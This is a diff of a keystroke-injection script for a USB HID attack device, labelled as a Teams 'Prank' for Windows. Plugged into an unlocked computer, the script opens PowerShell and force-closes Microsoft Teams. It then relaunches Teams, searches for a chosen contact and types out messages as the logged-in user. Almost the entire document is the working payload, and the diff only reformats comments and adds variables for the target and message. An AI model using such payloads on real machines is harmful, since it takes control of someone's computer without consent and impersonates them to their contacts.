@@ -1,48 +1,53 @@
-* ###########################################
-* #                                         |
-* # Title        : Send Messages In Teams   |
-* # Author       : Aleff                    |
-* # Version      : 1.0                      |
-* # Category     : Prank                    |
-* # Target       : Windows 10-11            |
-* #                                         |
-* ###########################################
+###########################################
+#                                         #
+# Title        : Send Messages In Teams   #
+# Author       : Aleff                    #
+# Version      : 1.0                      #
+# Category     : Prank                    #
+# Target       : Windows 10-11            #
+#                                         #
+###########################################
 
-* Requirements:
-*     - Microsoft Teams installed and user logged-in
-*     - Internet Connection
-*     - ExecutionPolicy Bypass
-*     - Python
+ATTACKMODE HID
 
-* 1. Open a powershell
-* 2. Close if Teams is opens and reopen it
-* 3. Goto search bar
-* 4. Search the person by name, email, id or what you want...
-* 5. Downarrow and enter to open the chat
+# REQUIREMENTS
+#  - Microsoft Teams installed and user logged-in
+#  - Internet Connection
+#  - ExecutionPolicy Bypass
+#  - Python
 
+# 1. Open a powershell
+# 2. Close if Teams is opens and reopen it
+# 3. Goto search bar
+# 4. Search the person by name, email, id or what you want...
+# 5. Downarrow and enter to open the chat
 
-QUACK DELAY 1000
+# VARIABLES
+#  - Name, email, id or what you want for contact the target
+USER-ID='example'
+# - Write the message replacing the example string
+MESSAGE='example'
+
+QUACK DELAY 1500
 QUACK GUI r
 QUACK DELAY 1000
 QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 2000
 
-* #### Powershell ####
-QUACK STRING Stop-Process -Name "Teams"
+#### Powershell ####
+QUACK STRING Stop-Process -Name 'Teams'
 QUACK ENTER
 QUACK DELAY 1000
-QUACK STRING Start-Process "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Microsoft Teams (work or school)"
+QUACK STRING Start-Process '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Microsoft Teams (work or school)'
 QUACK ENTER
-* It depends by the computer power
+# It depends by the computer power
 QUACK DELAY 10000
 
-* #### Teams ####
+#### Teams ####
 QUACK CTRL N
 QUACK DELAY 2000
-
-* REQUIRED - Name, email, id or what you want for contact the target
-QUACK STRING USER-ID
+QUACK STRING $USER-ID
 QUACK ENTER
 QUACK DELAY 2000
 QUACK TAB
@@ -50,17 +55,13 @@ QUACK DELAY 1000
 QUACK TAB
 QUACK DELAY 1000
 
-* #### Messages ####
-
-* REQUIRED - Messages
-* ...
-* DEFINE MESSAGEn example..
-QUACK STRING MESSAGE1
+#### Messages ####
+QUACK STRING $MESSAGE
 QUACK ENTER
 QUACK DELAY 1000
-* ...
-* STRING MESSAGEN
-* ENTER
+# ...
+# STRING MESSAGEN
+# ENTER
 
 QUACK DELAY 500
 QUACK ALT F4
